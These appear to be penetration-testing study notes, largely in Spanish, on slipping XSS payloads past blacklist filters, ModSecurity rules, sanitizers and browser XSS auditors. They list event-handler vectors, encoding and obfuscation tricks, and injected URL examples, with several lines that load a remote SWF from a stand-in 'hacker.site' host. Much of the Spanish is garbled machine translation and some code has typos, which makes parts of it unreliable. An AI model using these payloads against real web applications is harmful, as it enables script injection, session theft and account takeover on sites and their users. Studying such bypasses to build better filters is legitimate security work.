# XSS Filter Evasion and WAF Bypassing

```
https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

http://html5sec.org/

```

* Common scenarios

1. El vector XSS está bloqueado por la aplicación o algo más
2. El vector XSS se desinfecta
3. El vector XSS es filtrado o bloqueado por el navegador

## Bypassing Blackliting Filters

Es el más común. Su objetivo es detectar patrones específicos y prevenir comportamientos maliciosos.

### Inject Script Code

```js
<script>

# The <script> tag is the primary method which can be used to execute client-side scripting code such as javascript.
```

### Bypassing Weak script Tag Banning

```js
- Upper and Lower-case characters
- Upper and Lower-case without closing tag
- Random string after the tag name
- Newline after the tag name
- Nested tags
- NULL byte (IE up to v9)
# examples in images
```

## ModSecurity > Script Tag Based XSS Vectors Rule

Hay varias alternativas en las que es posible ejecutar nuestro código, tales como diferentes etiquetas HTML y manejadores de eventos relacionados.

### Beyond script Tag... Using HTML Attributes

```js
<a href="javascript:alert(1)">show</a>
<a href="data:text/html;base64,<alert(1) encoded>"show</a>
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data="javascript:alert(1)">
<object data="data:text/html;base64, <alert(1) encoded>">

# https://github.com/evilcos/xss.swf
<object data="//hacker.site/xss.swf">
<embed code="//hacker.site/xss.swf" allowscriptaccess=always>
```

### Beyond script Tag... Using HTML Events

* Los eventos son de la manera en que HTML DOM añade interactividad entre el sitio web y sus visitantes; Esto sucede simplemente ejecutando el código del lado del cliente (por ejemplo, JavaScript)

Casi todos los identificadores del controlador de eventos comienzan con **on** y son seguidos por el nombre del evento. Uno de los más utilizados es **onerror**:

```js
<img src=x onerror=alert(1)>
```

→ pero, tal vez hay otros eventos: http://help.dottoro.com/lhwfcplu.php

Ejemplos:

```js
<body onload=alert(1)>
<input type=image src=x:x onerror=alert(1)>
<isindex onmouseover="alert(1)" >
<form oninput=alert(1)><input></form>
<texarea autofocus onfocus=alert(1)>
<input oncut=alert(1)>
<svg onload=alert(1)>
<keygen autofocus onfocus=alert(1)">
<video><source onerror="alert(1)">
<marquee onstart=alert(1)>
```

* Desde un punto de vista defensivo, la solución es filtrar todos los eventos que comienzan con **on** con el fin de bloquear este punto de inyección.

Este es un regex muy común que podría encontrar ampliamente usado:

```js
(on\w+\s*=)

# We can bypass this filter:
<svg/onload=alert(1)>
<svg//////onload=alert(1)>
<svg id=x; onload=alert(1)>
<svg id='x' onload=alert(1)>
```

Tenemos un **Actuo**:

```js
(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
```

* Sin embargo, algunos navegadores convierten el carácter de control en un espacio, por lo tanto el meta-carácter no es suficiente para cubrir todos los posibles carbones.

Podemos eludir eso también:

```js
<svg onload%09=alert(1)> # Works in all browsers except Safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2C%3B=alert(1)>
<svg onload%0B=alert(1)>  # IE only
```

Los navegadores están en continua evolución; Por lo tanto, algunos de los chars permitidos pueden no funcionar más. Así, Shazzer Fuzz DB ha creado dos pruebas de fuzzer:

→ http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name

→ http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name

A los datos, una norma de regex válida debe ser la siguiente:

```js
(?i)([\s\"'`;\/0-9\=\x00\x09\x0A\x0C\0x0D\x3B\x2C\x28\x3B]+on\w+[\s\x00\x09\x0A\x0C\0x0D\x3B\x2C\x28\x3B]*?=)
```

## Keyword Based Filters

Hay filtros enfocados en prevenir el modo de scripting como **alerta, javascript, eval**

### Char Escaping

Aquí vemos Unicode Escaping sin usar funciones nativas:

```js
<script>\u0061lert(1)</script>
<script>\u0061\u006\u0065\u0072\u0074(1)</script>
```

Unicode escapando usando funciones nativas. Eval es sólo uno de muchos:

```js
<script>eval("\u0061lert(1)")</script>
<script>eval("\u0061\u006\u0065\u0072\u0074\u0028\u0031\u0029")</script>
```

Si el vector filtrado está dentro de una cadena, además de Unicode, hay múltiples escapses que podemos adoptar:

```js
<img src=x onerror="\u0061lert(1)"/>
<img src=x onerror="eval('\141lert(1)')"/>     # octal escape
<img src=x onerror="eval('\x61lert(1)')"/>     # hexa escape

<img src=x onerror="eval('&#x0061;lert(1)')"/> # hexa numeric char reference
<img src=x onerror="eval('&#97;lert(1)')"/>    # decimal NCR
<img src=x onerror="eval('\a\l\ert(1\)')"/>    # superfluous escapes chars

<img src=x onerror="eval('\u0065val('\141\u006c&#101;&#x0072t\(&#49)')"/>  '
# All chars escaping can stay together.
```

### Contructing String

Javascript jas several functions useful to create string:

```js
/ale/.source+/rt/.source
String.fromCharCode(97,108,101,114,116)
atob("YWxlcnQ=")
177985081..toString(36)
```

### Execution Sinks

* Técnicamente, las funciones que analizan la cadena como código JavaScript se llaman sumideros de ejecución, y JavaScript ofrece varias alternativas.

Some Sinks:

```js
setTimeout("JSCode") //all browsers
setInterval("JSCode") //all browsers
setImmediate("JSCode") //IE 10+
Function("JSCode") //all browsers

# moreover: https://code.google.com/p/domxsswiki/wiki/ExecutionSinks
```

Variación del lavabo de la Función:

```js
[].constructor.constructor(alert(1))
```

|object | array | function | XSS vector|

### Pseudo-protocols

**javascript:** es un esquema URI poco aficional, comúnmente conocido como un pseudo-protocolo.

* javascript followerd by (:) is usually blocked

Example:

```js
<a href="javascript:alert(1)"/>    " //blocked
# javascript: is not needed on event handlers; SO, we should avoid using it.
```

Bypass examples:

```js
<object data="JaVScRiPt:alert(1)">
<object data="javascript&colon;:alert(1)">
<object data="java
script:alert(1)">
<object data="javascript&#x003A;alert(1)">
<object data="javascript&#58;alert(1)">
<object data="&#x6A;avascript:alert(1)">
<object data="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">
```

* Además de **javascript:**, también hay **data:** y la exclusiva de IE **vbscript:**

Data URI scheme:

```js
data:[<mediatype>][;base64],<data>

# mediatype is usually 'text/html'
```

If **javascript:** is blocked:

```js
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html,base64,<base64 encoded>">
```

If **data:** is blocked:

```js
<embed code="DaTa:text/html,<script>alert(1)</script>">
<embed code="data&colon;text/html,<script>alert(1)</script>">
<embed code="data&#x003A;text/html,<script>alert(1)</script>">
<embed code="&#x64;&#x61;ta:text/html,<script>alert(1)</script>">
```

El **vbscript** pseudo-protocolo no es tan común, porque sólo se puede usar con IE.

* De IE11 in Edge, el vbscript ya no es compatible.

Cómo usar vbscript:

```js
<img src=a onerror="vbscript:msgbox 1"/> //works till IE8
<img src=b onerror="vbs:msgbox 2"/> //works till IE8
<img src=c onerror="vbs:alert(3)"/>   "//works till IE Edge
<img src=d onerror="vbscript:alert(4)"/>  "//works till IE Edge
```

Bypass vbscript:

```js
<img src=x onerror="vbscript&#x003A;alert(1)"/>    "
<img src=x onerror="vb&#x63;cript:alert(1)"/>       "

<img src=x onerror="v&#00;bs&#x00;cri pt:alert(1)"/> //using NUL bytes
```

Tool to obfuscate:

```js
http://dennisbabkin.com/screnc/
```

## Bypassing Sanitization

El más común es el código HTML como:

```js
< (&lt;)
> (&gt;)
```

### String Manipulations

Ejemplo:

```js
removing <script> tag
```

### Removing HTML tags

El cheque no se realiza recursivamente:

```js
<scr<script>ipt>alert(1)</script> # this could be a bypass
```

Si el filtro realiza comprobaciones recursivas, todavía podemos pasar el bypass. tal vez cambiando el orden de las cuerdas inyectadas.

```js
<scr<iframe>ipt>alert(1)</script> //this could be a bypass
```

* todo depende del filtro que estamos enfrentando

→ moreover: https://els-cdn.content-api.ine.com/eda3ac9d-554a-469a-98c6-639c90f0c7a5/index.html#

### Escaping Quotes

* Los filtros colocan la barra de fondo char \*\*\*\* antes de las citas para escapar de ese tipo de carácter

Example:

```js
randomkey\' alert(1);  # escape the apostrophe
randomkey\\' alert(1); # escape the backslash
```

Uno de los métodos Javascript útiles es:

```js
String.fromCharCode()
```

Nos permite generar cuerdas a partir de una secuencia de valores de Unicode:

```js
String.fromCharCode(120,115,9416)

# u+0078 Latin Small Letter x
# u+0073 Latin small Letter s
# u+24C8 Circled Latin capital letter (S)
```

```js
/your string/.source  //space allowed
43804..toString(36)   //spaces not allowed in Base36
```

Utilizando el método de unscape:

```js
unescape(/%78%u0073%73/.source) //its deprecated
```

Usando decodeURI y decodificandoURIComponent:

```js
# in this case, characters needs to be URL-encoded to avoid URI malformed errors

decodeURI(/alert(%22xss%22)/.source)
decodeURIcomponent(/alert(%22xss%22)/.source)
```

* Estos métodos podrían ser útiles si puede inyectarse en un script o manejador de eventos.
* No olvides que cada uno de ellos devolverá una cadena, por lo que necesitas una ejecución \*\* sink\*\* para activar el código (IE: **eval**)

### Escaping Parentheses

* La técnica abusa del manejador onerror, asignar una función a llamar una vez que se ha generado un error utilizando el lanzamiento seguido de los argumentos a la función asignada al manejador de errores.

→ moreover: http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/

```js
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
# eval - function to invoke in case of error
# throw - generate the error
# alert... - parameters For the error function

onerror=alert;throw 1; // a simple version
# does not work in Firefox and IE
```

Y dado que se cita la sección de argumentos, es posible hacer alguna codificación como la siguiente:

```js
<img src=x onerror="window.onerror=eval;throw'\u003d&#x006C;ert&#x0028;18#41;'"/>
```

## Bypassing Browser Filters

No cubren todos los posibles escenarios de attacl XSS y se centran en el tipo Reflected de XSS.

### UnFiltered Scenarios - Injecting Inside HTML Tag

```js
<svg/onload=alert(1)> # its detected by all main filters
```

```js
# Just by removing the final (>) we jave a bypass For browsers with XSSAuditor
<svg/onload=alert(1) // works chromium based browser
```

Inyectando dentro de los atributos de etiqueta HTML:

```js
site.com/inject?x=giuseppe"><svg/onload=alert(1)>
```

Podemos eludir a WebKit con:

```js
site.com/inject?x=giuseppe"><a/href="data:text/html;base64,<base64 payload>">clickhere<!--
```

Inyecting Inside SCRIPT Tag:

```js
site.com/inject?name=belucci";alert(1);//
```

Inyecting Attributos de Eventos Dentro:

```js
site.com/inject?roomID=alert(1)
```

DOM Based:

```js
site.com/inject?next=javascript:alert(1)
```

* DOM Based, hay otros escenarios que no están cubiertos por filtros de navegadores.

> Por ejemplo, **velos fragmentados** en múltiples parámetros o ataques de GET que no se reflejan en la misma página, mXSS, etc.
